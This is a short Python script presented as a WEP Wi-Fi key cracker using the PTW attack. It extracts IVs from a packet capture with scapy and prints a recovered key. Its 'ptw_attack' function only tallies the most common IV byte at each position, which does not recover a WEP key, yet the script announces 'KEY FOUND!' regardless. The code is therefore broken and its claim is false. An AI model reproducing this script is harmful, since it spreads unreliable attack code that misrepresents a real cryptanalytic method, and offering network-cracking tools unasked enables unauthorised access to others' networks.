import argparse
import scapy.all as scapy
import numpy as np
from collections import Counter

def extract_ivs(pcap_file):
    packets = scapy.rdpcap(pcap_file)
    ivs = []
    for packet in packets:
        if packet.haslayer(scapy.Dot11WEP) and hasattr(packet, 'iv'):
            iv = bytes(packet.iv)
            if len(iv) == 3:  # Ensure IV is 3 bytes as expected in WEP
                ivs.append(iv)
    return ivs

def ptw_attack(ivs, key_size=13):
    byte_guesses = [Counter() for _ in range(key_size)]
    for iv in ivs:
        for i in range(min(len(iv), key_size)):
            byte_guesses[i][iv[i]] += 1
    
    key = bytes([max(byte_guess, key=byte_guess.get, default=0) for byte_guess in byte_guesses])
    return key

def main():
    parser = argparse.ArgumentParser(description='WEP Key Cracker using PTW Attack')
    parser.add_argument('pcap_file', help='Captured .cap file')
    args = parser.parse_args()
    
    print("[*] Extracting IVs...")
    ivs = extract_ivs(args.pcap_file)
    print(f"[*] Total IVs captured: {len(ivs)}")
    
    if len(ivs) < 100:
        print("[!] Not enough IVs for reliable cracking. Minimum required: 100.")
        return
    
    print("[*] Performing PTW Attack...")
    wep_key = ptw_attack(ivs)
    
    print("[+] KEY FOUND! [", ':'.join(f'{b:02X}' for b in wep_key), "]")

if __name__ == "__main__":
    main()
